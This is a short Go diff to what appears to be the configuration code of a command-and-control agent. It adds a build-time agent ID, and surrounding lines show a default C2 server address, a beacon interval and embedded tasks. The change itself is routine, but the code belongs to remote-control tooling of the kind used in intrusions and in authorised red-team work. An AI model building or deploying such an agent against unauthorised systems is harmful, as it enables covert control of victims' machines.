@@ -7,6 +7,7 @@ import (
 
 // Build-time configuration (injected via -ldflags)
 var (
+	EmbeddedAgentID = ""                    // Agent ID set at build time
 	BeaconInterval = "30s"                  // Default beacon interval
 	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
 	EmbeddedTasks  = "[]"                   // JSON array of tasks to execute
@@ -50,7 +51,12 @@ func Load() *Config {
 	
 	// Set defaults
 	if cfg.AgentID == "" {
-		cfg.AgentID = "agent-" + time.Now().Format("20060102150405")
+		// Use embedded agent ID from build-time if available
+		if EmbeddedAgentID != "" {
+			cfg.AgentID = EmbeddedAgentID
+		} else {
+			cfg.AgentID = "agent-" + time.Now().Format("20060102150405")
+		}
 	}
 	
 	if cfg.C2URL == "" {
